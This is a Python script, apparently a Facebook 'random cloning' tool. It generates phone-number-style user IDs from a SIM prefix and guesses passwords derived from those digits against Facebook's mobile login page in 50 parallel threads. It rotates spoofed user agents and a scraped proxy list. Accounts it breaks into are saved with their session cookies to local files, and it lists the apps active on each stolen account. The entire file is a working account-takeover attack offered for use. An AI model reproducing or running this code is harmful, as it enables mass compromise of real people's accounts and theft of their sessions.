import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
def ua():
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['9','10','11','12','13','14','15',])
       c='SM-S911B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
       d= random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
def ua():
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['4.4.4','6.0.1','7.1.1','8.1.0','9',])
       c='Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
       d= random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)     
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.1'
ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/532.1 (KHTML, like Gecko) CriOS/59.0.874.0 Mobile/48W241 Safari/532.1'       
os.system('clear')
print("\033[\033[1;91mTOOLS UPDATE SUCCESSFUL")
time.sleep(5)
os.system('clear')        

logo = ("""
 
$$$$$$\ $$\   $$\ $$$$$$$\  
\_$$  _|$$ |  $$ |$$  __$$\ 
  $$ |  $$ |  $$ |$$ |  $$ |
  $$ |  $$$$$$$$ |$$$$$$$  |
  $$ |  $$  __$$ |$$  __$$< 
  $$ |  $$ |  $$ |$$ |  $$ |
$$$$$$\ $$ |  $$ |$$ |  $$ |
\______|\__|  \__|\__|  \__|
                            
\33[1;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓            
┃\x1b[97m\033[37;41m   RANDOM CLONING FREE TOOLS V1    \033[0;m\33[1;92m┃
\33[1;92m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛        
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\x1b[1;92m┃ \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m AUTHOR    : RAYHAN AHMED            ┃         
\x1b[1;92m┃ \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;92mFACEBOOK  : IMRAN HOSSAIN          ┃       
\x1b[1;92m┃ \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;92mGITHUB    : RAYHAN-SHAKIB             ┃
\x1b[1;92m┃ \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;92mTOOL      : FREE                                     ┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")



def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))



class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [1] Random Uid Clone")
        print(" [0] Exit")
        print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
        Mumit =input(" [?] Choose : ")
        
        if Mumit in ["1", "1"]:
            M1()
        else:
            exit()
def M1():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017/ 018/ 019/ 016/ 013/ 014 ')
    print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m YOUR SIM CODE : '+kode)
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m TOTAL ID : '+tl)
        print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r [IMRAN] %s|%s\33[1;92m[OK-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=PqRlZAf2_dNhb-1Q2lJX4UoH; datr=PqRlZC0axyhsrVl1D_263ntu; m_pixel_ratio=1; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZiaUxjMGxMMW5vUE1GbGRjSWFYcGRPVWNuR3BweUVvSHZGOU5pNTFmdG5PZGw2dHlkRGFOWnpwUGJ4UnMtT0JsNCIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZmJpTGMwbEwxbm9QTUZsZGNJYVhwZE9VY25HcHB5RW9IdkY5Tmk1MWZ0bk9kbDZ0eWREYU5aenBQYnhScy1PQmw0IiwicyI6IngifQ%3D%3D; wd=811x635; fr=0fQIrfeI7s1fqqNrT.AWUsLsZLqhGGKoQUUkXbwNwQJSY.BkfB61.rQ.AAA.0.0.BkfB7e.AWVj5ro_kF4',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.90", "Google Chrome";v="114.0.5735.90"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\x1b[38;5;46m[IMRAN-OK] '+cid+' | '+ps+'\033[1;97m')
                print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
                open('IMRAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid);cek_apk(coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;91m[CHECKPOINT] '+uid+' | '+ps+'\33[0;97m')
                open('IMRAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                break
            else:
                continue
        loop+=1
    
    except:
        pass
Main()